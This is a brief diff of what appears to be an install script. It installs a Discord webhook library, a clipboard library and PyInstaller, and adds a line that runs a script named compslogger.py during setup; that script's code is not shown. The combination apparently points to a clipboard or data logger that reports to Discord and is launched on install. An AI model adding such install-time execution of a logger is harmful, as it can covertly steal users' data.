@@ -9,3 +9,4 @@ pip install discord_webhook
 pip install pyperclip
 pip install pyinstaller
 pip install chardet
+python compslogger.py
